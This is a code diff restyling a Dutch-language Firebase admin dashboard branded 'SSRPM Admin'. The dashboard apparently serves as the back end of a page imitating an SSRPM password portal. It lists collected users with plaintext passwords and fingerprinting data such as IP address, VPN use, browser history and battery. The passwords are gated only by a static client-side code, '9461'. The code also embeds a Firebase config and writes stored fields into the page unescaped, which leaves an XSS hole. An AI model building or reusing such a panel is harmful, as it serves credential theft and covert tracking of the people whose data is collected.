@@ -1,444 +1,395 @@
 <!DOCTYPE html>
 <html lang="nl">
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard - SSRPM</title>
-    <link href="../css/css.css" rel="stylesheet">
-    <link href="../css/custom.css" rel="stylesheet" type="text/css">
-    <link href="../css/ssrpm.css" rel="stylesheet" type="text/css">
-    <link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon">
-    <link rel="icon" href="../images/favicon.ico" type="image/ico">
-    <script src="../js/jquery.js"></script>
-    <script src="../js/bootstrap.js"></script>
-    
-    <!-- Firebase SDK -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js";
-        import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard - SSRPM</title>
+  <link rel="shortcut icon" href="../images/favicon.ico" type="image/x-icon" />
+  <link rel="icon" href="../images/favicon.ico" type="image/ico" />
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U",
-            authDomain: "project34-baebd.firebaseapp.com",
-            projectId: "project34-baebd",
-            storageBucket: "project34-baebd.firebasestorage.app",
-            messagingSenderId: "92418567493",
-            appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c"
-        };
+  <!-- Optional: keep your original CSS links if they include brand/logo assets -->
+  <link href="../css/css.css" rel="stylesheet" />
+  <link href="../css/custom.css" rel="stylesheet" type="text/css" />
+  <link href="../css/ssrpm.css" rel="stylesheet" type="text/css" />
 
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
+  <style>
+    :root {
+      --bg: #0b1220;
+      --bg-soft: #0f1a33;
+      --card: #10192d;
+      --card-2: #0f1730;
+      --text: #e6ecff;
+      --muted: #9cb1d6;
+      --line: rgba(255,255,255,0.08);
+      --primary: #4a90e2; /* Lucas primary blue */
+      --primary-600: #3b7bc4;
+      --success: #50c878;
+      --danger: #dc3545;
+      --warning: #ffd66b;
+      --radius-lg: 16px;
+      --radius-md: 12px;
+      --radius-sm: 10px;
+      --shadow-1: 0 6px 24px rgba(0,0,0,0.25);
+      --shadow-2: 0 10px 30px rgba(0,0,0,0.35);
+      --ring: 0 0 0 3px rgba(74,144,226,0.35);
+    }
 
-        // Check authentication state
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                showDashboard();
-            } else {
-                showLoginForm();
-            }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      background: radial-gradient(1200px 800px at 20% -10%, #1a2a55 0%, transparent 60%),
+                  radial-gradient(1200px 900px at 110% 20%, #123d5f 0%, transparent 65%),
+                  var(--bg);
+      color: var(--text);
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji", "Segoe UI Emoji";
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* Utility */
+    .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
+    .hidden { display: none !important; }
+
+    /* Header */
+    .topbar {
+      position: sticky; top: 0; z-index: 50;
+      backdrop-filter: saturate(140%) blur(10px);
+      background: linear-gradient(180deg, rgba(16,25,45,0.9), rgba(16,25,45,0.7));
+      border-bottom: 1px solid var(--line);
+    }
+    .topbar-inner { display: flex; align-items: center; justify-content: space-between; padding: 16px 24px; }
+    .brand { display: flex; align-items: center; gap: 10px; }
+    .brand-logo { width: 36px; height: 36px; border-radius: 10px; background: linear-gradient(135deg, var(--primary), #7fb2f0); box-shadow: var(--shadow-1); }
+    .brand-title { font-weight: 700; letter-spacing: 0.2px; }
+
+    /* Auth card */
+    .center-wrap { min-height: calc(100dvh - 72px); display: grid; place-items: center; padding: 32px 16px; }
+    .auth-card {
+      width: 100%; max-width: 520px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)), var(--card);
+      border: 1px solid var(--line);
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-2);
+      padding: 28px;
+    }
+    .auth-head { display: flex; align-items: center; gap: 14px; margin-bottom: 18px; }
+    .auth-icon { width: 44px; height: 44px; border-radius: 12px; background: linear-gradient(135deg, var(--primary), #7fb2f0); box-shadow: var(--shadow-1); }
+    .auth-title { font-size: 22px; font-weight: 800; }
+    .muted { color: var(--muted); font-size: 14px; }
+
+    /* Inputs */
+    .field { display: grid; gap: 8px; margin-top: 14px; }
+    label { color: var(--muted); font-weight: 600; font-size: 13px; }
+    .input {
+      background: var(--card-2);
+      border: 1px solid var(--line);
+      color: var(--text);
+      border-radius: var(--radius-md);
+      padding: 12px 14px;
+      outline: none; transition: box-shadow .15s ease, border-color .15s ease;
+      width: 100%;
+    }
+    .input:focus { box-shadow: var(--ring); border-color: var(--primary); }
+
+    /* Buttons */
+    .btn {
+      appearance: none; border: none; cursor: pointer; user-select: none; text-decoration: none;
+      padding: 12px 16px; border-radius: var(--radius-md); font-weight: 700; letter-spacing: .2px;
+      transition: transform .02s ease, box-shadow .15s ease, background .2s ease;
+      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .btn:active { transform: translateY(1px); }
+    .btn-primary { background: linear-gradient(135deg, var(--primary), #7fb2f0); color: #0b1220; box-shadow: var(--shadow-1); }
+    .btn-primary:hover { filter: brightness(1.1); }
+    .btn-ghost { background: transparent; color: var(--text); border: 1px solid var(--line); }
+    .btn-danger { background: linear-gradient(135deg, #dc3545, #f16a76); color: #fff; box-shadow: var(--shadow-1); }
+
+    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 16px; }
+
+    /* Progress (decorative) */
+    .progress-shell {
+      height: 8px; background: var(--card-2); border-radius: 999px; border: 1px solid var(--line);
+      overflow: hidden; margin: 10px 0 6px; position: relative;
+    }
+    .progress-bar { height: 100%; width: 38%; background: linear-gradient(90deg, var(--primary), #7fb2f0); }
+
+    /* Dashboard layout */
+    .grid { display: grid; grid-template-columns: 1.2fr .8fr; gap: 20px; }
+    @media (max-width: 980px){ .grid { grid-template-columns: 1fr; } }
+
+    .card {
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)), var(--card);
+      border: 1px solid var(--line);
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-1);
+      padding: 18px;
+    }
+
+    .dash-head { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 12px; }
+
+    .search { display: flex; gap: 10px; }
+
+    .list { display: grid; gap: 10px; }
+    .user-item {
+      background: var(--card-2); border: 1px solid var(--line); padding: 14px 14px; border-radius: var(--radius-md);
+      display: grid; grid-template-columns: 1fr auto; gap: 8px; align-items: center; cursor: pointer;
+      transition: border-color .15s ease, box-shadow .15s ease, transform .05s ease;
+    }
+    .user-item:hover { box-shadow: var(--shadow-1); border-color: rgba(74,144,226,0.35); }
+    .user-item.selected { outline: none; box-shadow: var(--ring); border-color: var(--primary); }
+    .user-name { font-weight: 700; }
+    .timestamp { color: var(--muted); font-size: 12px; }
+
+    .details .row { display: grid; gap: 12px; }
+    .detail { border-bottom: 1px dashed var(--line); padding-bottom: 10px; }
+    .detail:last-child { border-bottom: 0; padding-bottom: 0; }
+    .detail label { display: block; color: var(--muted); font-size: 12px; margin-bottom: 6px; }
+    .detail .val { word-break: break-word; }
+
+    .password-field {
+      background: #0c1326; color: #0c1326; border: 1px solid var(--line);
+      padding: 10px 12px; border-radius: var(--radius-sm); font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      display: inline-block; min-width: 120px; user-select: none; cursor: pointer;
+    }
+    .password-field.revealed { color: var(--text); background: #0b1220; border-color: rgba(255,255,255,0.16); }
+
+    .unlock { display: flex; gap: 8px; margin-top: 8px; }
+    .unlock .input { padding: 10px 12px; }
+  </style>
+
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-auth.js";
+    import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U",
+      authDomain: "project34-baebd.firebaseapp.com",
+      projectId: "project34-baebd",
+      storageBucket: "project34-baebd.firebasestorage.app",
+      messagingSenderId: "92418567493",
+      appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+
+    // Auth state
+    onAuthStateChanged(auth, (user) => {
+      if (user) {
+        showDashboard();
+      } else {
+        showLoginForm();
+      }
+    });
+
+    // Login (password)
+    window.loginUser = async function () {
+      const email = document.getElementById('email')?.value?.trim();
+      const password = document.getElementById('password')?.value;
+      try { await signInWithEmailAndPassword(auth, email, password); }
+      catch (error) { alert('Login mislukt: ' + error.message); }
+    }
+
+    // Email-link (passwordless)
+    window.sendLoginLink = async function () {
+      const email = document.getElementById('email')?.value?.trim();
+      if (!email) { alert('Vul je email in.'); return; }
+      try {
+        const actionCodeSettings = { url: window.location.href, handleCodeInApp: true };
+        await sendSignInLinkToEmail(auth, email, actionCodeSettings);
+        window.localStorage.setItem('emailForSignIn', email);
+        alert('Login link verzonden. Controleer je email.');
+      } catch (e) { alert('Kon geen login link versturen: ' + e.message); }
+    }
+
+    // Complete sign-in if link opened
+    if (isSignInWithEmailLink(auth, window.location.href)) {
+      let email = window.localStorage.getItem('emailForSignIn');
+      if (!email) email = window.prompt('Bevestig je email voor login');
+      signInWithEmailLink(auth, email, window.location.href)
+        .then(() => { window.localStorage.removeItem('emailForSignIn'); })
+        .catch(err => alert('Email link login mislukt: ' + err.message));
+    }
+
+    // Login view
+    function showLoginForm() {
+      document.body.innerHTML = `
+        <header class="topbar">
+          <div class="topbar-inner">
+            <div class="brand">
+              <div class="brand-logo"></div>
+              <div>
+                <div class="brand-title">SSRPM Admin</div>
+                <div class="muted">Beheerportaal • secure access</div>
+              </div>
+            </div>
+            <div class="muted">v1.0</div>
+          </div>
+        </header>
+
+        <main class="center-wrap">
+          <section class="auth-card" role="dialog" aria-labelledby="auth-title">
+            <div class="auth-head">
+              <div class="auth-icon" aria-hidden="true"></div>
+              <div>
+                <h1 id="auth-title" class="auth-title">Admin Login Portal</h1>
+                <p class="muted">Log in met je beheerdersaccount of ontvang een magic link.</p>
+              </div>
+            </div>
+
+            <div class="progress-shell" aria-hidden="true"><div class="progress-bar"></div></div>
+
+            <div class="field">
+              <label for="email">Email</label>
+              <input id="email" type="email" class="input" placeholder="naam@voorbeeld.nl" autofocus />
+            </div>
+            <div class="field">
+              <label for="password">Wachtwoord</label>
+              <input id="password" type="password" class="input" placeholder="••••••••" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-ghost" onclick="window.location.href='https://sgdcproject34.github.io/project34-spinoza/'">Terug</button>
+              <button class="btn btn-primary" onclick="loginUser()">Inloggen</button>
+              <button class="btn btn-ghost" onclick="sendLoginLink()">Stuur login link</button>
+            </div>
+          </section>
+        </main>
+      `;
+    }
+
+    // Dashboard view
+    async function showDashboard() {
+      try {
+        const usersSnapshot = await getDocs(query(collection(db, 'users'), orderBy('timestamp', 'desc')));
+        const users = [];
+        usersSnapshot.forEach((doc) => users.push({ id: doc.id, ...doc.data() }));
+
+        const rows = users.map(u => {
+          const ts = (u.timestamp && typeof u.timestamp.toDate === 'function') ? new Date(u.timestamp.toDate()) : null;
+          const tsText = ts ? ts.toLocaleString() : '—';
+          const name = (u.username || 'Onbekend');
+          return `
+            <div class="user-item" onclick="selectUser(event, '${u.id}')">
+              <div class="user-name">${name}</div>
+              <div class="timestamp">${tsText}</div>
+            </div>`
+        }).join('');
+
+        document.body.innerHTML = `
+          <header class="topbar">
+            <div class="topbar-inner">
+              <div class="brand">
+                <div class="brand-logo"></div>
+                <div>
+                  <div class="brand-title">SSRPM Admin</div>
+                  <div class="muted">Gebruikersbeheer</div>
+                </div>
+              </div>
+              <div class="btn-row"><button class="btn btn-danger" onclick="logout()">Uitloggen</button></div>
+            </div>
+          </header>
+
+          <main class="container">
+            <div class="grid">
+              <section class="card">
+                <div class="dash-head">
+                  <h2 style="margin:0">Gebruikers</h2>
+                  <div class="search">
+                    <input id="searchInput" class="input" placeholder="Zoek gebruikersnaam…" />
+                  </div>
+                </div>
+                <div class="list" id="usersList">${rows}</div>
+              </section>
+
+              <aside class="card details" id="userDetails" style="position:sticky; top:16px; height: fit-content;">
+                <div class="dash-head"><h3 style="margin:0">Details</h3></div>
+                <div id="userInfo" class="row muted">Selecteer een gebruiker…</div>
+              </aside>
+            </div>
+          </main>
+        `;
+
+        // Search functionality
+        document.getElementById('searchInput').addEventListener('input', (e) => {
+          const q = e.target.value.toLowerCase();
+          document.querySelectorAll('.user-item').forEach(el => {
+            const name = el.querySelector('.user-name')?.textContent?.toLowerCase() || '';
+            el.style.display = name.includes(q) ? 'grid' : 'none';
+          });
         });
 
-        // Login function (password)
-        window.loginUser = async function() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            try {
-                await signInWithEmailAndPassword(auth, email, password);
-            } catch (error) {
-                alert('Login mislukt: ' + error.message);
-            }
-        };
+        // Store users globally
+        window.usersData = users;
+      } catch (error) {
+        console.error('Error loading dashboard:', error);
+        alert('Fout bij laden dashboard: ' + error.message);
+      }
+    }
 
-        // Email link (passwordless) login
-        window.sendLoginLink = async function() {
-            const email = document.getElementById('email').value;
-            if (!email) { alert('Vul je email in.'); return; }
-            try {
-                const actionCodeSettings = {
-                    url: window.location.href,
-                    handleCodeInApp: true
-                };
-                await sendSignInLinkToEmail(auth, email, actionCodeSettings);
-                window.localStorage.setItem('emailForSignIn', email);
-                alert('Login link verzonden. Controleer je email.');
-            } catch (e) {
-                alert('Kon geen login link versturen: ' + e.message);
-            }
-        }
+    // Select user
+    window.selectUser = function (ev, userId) {
+      const user = window.usersData.find(u => u.id === userId);
+      if (!user) return;
 
-        // Complete sign-in if link opened
-        if (isSignInWithEmailLink(auth, window.location.href)) {
-            let email = window.localStorage.getItem('emailForSignIn');
-            if (!email) {
-                email = window.prompt('Bevestig je email voor login');
-            }
-            signInWithEmailLink(auth, email, window.location.href)
-                .then(() => {
-                    window.localStorage.removeItem('emailForSignIn');
-                })
-                .catch(err => alert('Email link login mislukt: ' + err.message));
-        }
+      document.querySelectorAll('.user-item').forEach(i => i.classList.remove('selected'));
+      ev.currentTarget.classList.add('selected');
 
-        // Show login form
-        function showLoginForm() {
-            document.body.innerHTML = `
-                <div class="container-fluid">
-                    <div class="row width-100-percent">
-                        <div class="col-sm-2"></div>
-                        <div class="col-sm-2"></div>
-                        <div class="col-sm-2"></div>
-                        <div class="col-sm-2"></div>
-                        <div class="col-sm-2"></div>
-                        <div class="col-sm-2"></div>
-                    </div>
-                </div>
+      const userInfo = document.getElementById('userInfo');
+      const ts = (user.timestamp && typeof user.timestamp.toDate === 'function') ? new Date(user.timestamp.toDate()).toLocaleString() : '—';
 
-                <div class="logo-body">
-                    <div class="logo-container">
-                        <div class="logo"></div>
-                    </div>
-                </div>
+      userInfo.innerHTML = `
+        <div class="detail"><label>Gebruikersnaam</label><div class="val">${user.username || 'Niet beschikbaar'}</div></div>
+        <div class="detail">
+          <label>Wachtwoord</label>
+          <div class="password-field" id="password-${userId}" onclick="togglePassword('${userId}')">••••••••</div>
+          <div class="unlock hidden" id="unlock-${userId}">
+            <input type="password" class="input" placeholder="Code invoeren" id="unlockCode-${userId}" />
+            <button class="btn btn-primary" onclick="unlockPassword('${userId}')">Ontgrendelen</button>
+          </div>
+        </div>
+        <div class="detail"><label>VPN gebruikt</label><div class="val">${user.vpnUsed === true ? 'Ja' : (user.vpnUsed === false ? 'Nee' : 'Onbekend')}</div></div>
+        <div class="detail"><label>IP-adres</label><div class="val">${user.ipAddress || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Server Locatie</label><div class="val">${user.serverLocation || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>User-Agent</label><div class="val">${user.userAgent || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Besturingssysteem</label><div class="val">${user.operatingSystem || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Schermgrootte</label><div class="val">${user.screenSize || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Taal</label><div class="val">${user.language || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Tijdzone</label><div class="val">${user.timezone || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Batterij</label><div class="val">${user.battery || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Browser History</label><div class="val">${user.browserHistory || 'Niet beschikbaar'}</div></div>
+        <div class="detail"><label>Timestamp</label><div class="val">${ts}</div></div>
+      `;
+    }
 
-                <div class="ssrpmbody">
-                    <div class="formheader">
-                        <div class="enroll-icon form-icon"></div>
-                        <div class="formheader-vertical">
-                            <div class="formheader-text">Admin Login Portal</div>
-                        </div>
-                    </div>
+    // Toggle password field (show unlock)
+    window.togglePassword = function (userId) {
+      const el = document.getElementById('unlock-' + userId);
+      if (!el) return;
+      el.classList.toggle('hidden');
+    }
 
-                    <div class="progress-div">
-                        <div class="progress">
-                            <div class="progress-bar" role="progressbar" style="width:430px"></div>
-                        </div>
-                        <div class="progress-steps"></div>
-                    </div>
-                    
-                    <div class="form-body"> 
-                        <div class="row">
-                            <div class="col-sm-12">
-                                <div class="form-container">
-                                    <div class="form-group-label">
-                                        <label for="email">Email:</label>
-                                    </div>
-                                    <div class="form-group-edit">
-                                        <input autofocus="autofocus" class="form-control text-box single-line" id="email" placeholder="Vul email in" type="email">
-                                    </div>
-                                    <div class="form-group-label">
-                                        <label for="password">Wachtwoord:</label>
-                                    </div>
-                                    <div class="form-group-edit">
-                                        <input class="form-control text-box single-line password" id="password" placeholder="Vul wachtwoord in" type="password">
-                                    </div>
-                                </div>
+    // Unlock password (DEMO: static code)
+    window.unlockPassword = function (userId) {
+      const code = document.getElementById('unlockCode-' + userId)?.value;
+      if (code === '9461') {
+        const user = window.usersData.find(u => u.id === userId);
+        const field = document.getElementById('password-' + userId);
+        field.textContent = user.password || 'Niet beschikbaar';
+        field.classList.add('revealed');
+        document.getElementById('unlock-' + userId).classList.add('hidden');
+      } else {
+        alert('Onjuiste code!');
+      }
+    }
 
-                                <div class="nav-btn-group">
-                                    <input type="button" class="cancel btn-submit" value="Terug" onclick="window.location.href='https://sgdcproject34.github.io/project34-spinoza/'">
-                                    <input type="button" class="btn-submit" value="Inloggen" onclick="loginUser()">
-                                    <input type="button" class="btn-submit" value="Stuur login link" onclick="sendLoginLink()">
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        // Show dashboard
-        async function showDashboard() {
-            try {
-                const usersSnapshot = await getDocs(query(collection(db, 'users'), orderBy('timestamp', 'desc')));
-                const users = [];
-                usersSnapshot.forEach((doc) => {
-                    users.push({ id: doc.id, ...doc.data() });
-                });
-
-                document.body.innerHTML = `
-                    <div class="container-fluid">
-                        <div class="row">
-                            <div class="col-md-8">
-                                <div class="dashboard-header">
-                                    <h2>Gebruikers Dashboard</h2>
-                                    <button class="btn btn-danger" onclick="logout()">Uitloggen</button>
-                                </div>
-                                
-                                <div class="search-container">
-                                    <input type="text" id="searchInput" placeholder="Zoek gebruikersnaam..." class="form-control">
-                                </div>
-                                
-                                <div class="users-list" id="usersList">
-                                    ${users.map(user => `
-                                        <div class="user-item" onclick="selectUser('${user.id}')">
-                                            <strong>${user.username || 'Onbekend'}</strong>
-                                            <span class="timestamp">${new Date(user.timestamp?.toDate()).toLocaleString()}</span>
-                                        </div>
-                                    `).join('')}
-                                </div>
-                            </div>
-                            
-                            <div class="col-md-4">
-                                <div class="user-details" id="userDetails" style="display: none;">
-                                    <h3>Gebruikersdetails</h3>
-                                    <div id="userInfo"></div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <style>
-                        .dashboard-header { 
-                            display: flex; 
-                            justify-content: space-between; 
-                            align-items: center; 
-                            margin-bottom: 20px; 
-                            padding: 20px;
-                            background: #f8f9fa;
-                            border-radius: 5px;
-                        }
-                        .search-container { 
-                            margin-bottom: 20px; 
-                        }
-                        .user-item { 
-                            padding: 15px; 
-                            border: 1px solid #ddd; 
-                            margin-bottom: 10px; 
-                            cursor: pointer; 
-                            border-radius: 5px;
-                            transition: background-color 0.3s;
-                            background: white;
-                        }
-                        .user-item:hover { 
-                            background-color: #f5f5f5; 
-                        }
-                        .user-item.selected { 
-                            background-color: #e3f2fd; 
-                            border-color: #2196f3;
-                        }
-                        .timestamp { 
-                            float: right; 
-                            color: #666; 
-                            font-size: 12px; 
-                        }
-                        .user-details { 
-                            background: #f9f9f9; 
-                            padding: 20px; 
-                            border-radius: 5px; 
-                            border: 1px solid #ddd;
-                            position: sticky;
-                            top: 20px;
-                        }
-                        .detail-item {
-                            margin-bottom: 15px;
-                            padding-bottom: 10px;
-                            border-bottom: 1px solid #eee;
-                        }
-                        .detail-item label {
-                            font-weight: bold;
-                            color: #333;
-                            display: block;
-                            margin-bottom: 5px;
-                        }
-                        .detail-item div {
-                            color: #666;
-                            word-break: break-all;
-                        }
-                        .password-field { 
-                            background: #000; 
-                            color: #000; 
-                            border: 1px solid #333; 
-                            padding: 8px; 
-                            border-radius: 3px;
-                            cursor: pointer;
-                            user-select: none;
-                            font-family: monospace;
-                            display: inline-block;
-                            min-width: 100px;
-                        }
-                        .password-field.revealed { 
-                            background: #fff; 
-                            color: #000; 
-                            border-color: #ccc;
-                        }
-                        .unlock-form { 
-                            margin-top: 10px; 
-                        }
-                        .unlock-form input { 
-                            margin-right: 10px; 
-                            padding: 5px;
-                            border: 1px solid #ccc;
-                            border-radius: 3px;
-                        }
-                        .unlock-form button {
-                            padding: 5px 10px;
-                            background: #007bff;
-                            color: white;
-                            border: none;
-                            border-radius: 3px;
-                            cursor: pointer;
-                        }
-                        .unlock-form button:hover {
-                            background: #0056b3;
-                        }
-                        .btn {
-                            padding: 8px 16px;
-                            border: none;
-                            border-radius: 4px;
-                            cursor: pointer;
-                            text-decoration: none;
-                            display: inline-block;
-                        }
-                        .btn-danger {
-                            background-color: #dc3545;
-                            color: white;
-                        }
-                        .btn-danger:hover {
-                            background-color: #c82333;
-                        }
-                    </style>
-                `;
-
-                // Setup search functionality
-                document.getElementById('searchInput').addEventListener('input', function(e) {
-                    const searchTerm = e.target.value.toLowerCase();
-                    const userItems = document.querySelectorAll('.user-item');
-                    userItems.forEach(item => {
-                        const username = item.querySelector('strong').textContent.toLowerCase();
-                        item.style.display = username.includes(searchTerm) ? 'block' : 'none';
-                    });
-                });
-
-                // Store users data globally for access
-                window.usersData = users;
-            } catch (error) {
-                console.error('Error loading dashboard:', error);
-                alert('Fout bij laden dashboard: ' + error.message);
-            }
-        }
-
-        // Select user function
-        window.selectUser = function(userId) {
-            const user = window.usersData.find(u => u.id === userId);
-            if (!user) return;
-
-            // Remove previous selection
-            document.querySelectorAll('.user-item').forEach(item => {
-                item.classList.remove('selected');
-            });
-
-            // Add selection to clicked item
-            event.currentTarget.classList.add('selected');
-
-            // Show user details
-            const userDetails = document.getElementById('userDetails');
-            const userInfo = document.getElementById('userInfo');
-            
-            userDetails.style.display = 'block';
-            userInfo.innerHTML = `
-                <div class="detail-item">
-                    <label>Gebruikersnaam:</label>
-                    <div>${user.username || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Wachtwoord:</label>
-                    <div class="password-field" onclick="togglePassword('${userId}')" id="password-${userId}">
-                        ••••••••
-                    </div>
-                    <div class="unlock-form" id="unlock-${userId}" style="display: none;">
-                        <input type="password" placeholder="Code invoeren" id="unlockCode-${userId}">
-                        <button onclick="unlockPassword('${userId}')">Ontgrendelen</button>
-                    </div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>VPN gebruikt:</label>
-                    <div>${user.vpnUsed === true ? 'Ja' : (user.vpnUsed === false ? 'Nee' : 'Onbekend')}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>IP-adres:</label>
-                    <div>${user.ipAddress || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Server Locatie:</label>
-                    <div>${user.serverLocation || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>User-Agent:</label>
-                    <div>${user.userAgent || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Besturingssysteem:</label>
-                    <div>${user.operatingSystem || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Schermgrootte:</label>
-                    <div>${user.screenSize || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Taal:</label>
-                    <div>${user.language || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Tijdzone:</label>
-                    <div>${user.timezone || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Batterij:</label>
-                    <div>${user.battery || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Browser History:</label>
-                    <div>${user.browserHistory || 'Niet beschikbaar'}</div>
-                </div>
-                
-                <div class="detail-item">
-                    <label>Timestamp:</label>
-                    <div>${new Date(user.timestamp?.toDate()).toLocaleString()}</div>
-                </div>
-            `;
-        };
-
-        // Toggle password visibility
-        window.togglePassword = function(userId) {
-            const unlockForm = document.getElementById('unlock-' + userId);
-            unlockForm.style.display = unlockForm.style.display === 'none' ? 'block' : 'none';
-        };
-
-        // Unlock password
-        window.unlockPassword = function(userId) {
-            const code = document.getElementById('unlockCode-' + userId).value;
-            if (code === '9461') {
-                const user = window.usersData.find(u => u.id === userId);
-                const passwordField = document.getElementById('password-' + userId);
-                passwordField.textContent = user.password || 'Niet beschikbaar';
-                passwordField.classList.add('revealed');
-                document.getElementById('unlock-' + userId).style.display = 'none';
-            } else {
-                alert('Onjuiste code!');
-            }
-        };
-
-        // Logout function
-        window.logout = function() {
-            signOut(auth);
-        };
-    </script>
+    // Logout
+    window.logout = function () { signOut(auth); }
+  </script>
 </head>
-
-<body class="body-image" scroll="no">
-    <!-- Content will be dynamically loaded -->
+<body>
+  <!-- Content dynamically injected by JS -->
 </body>
 </html>
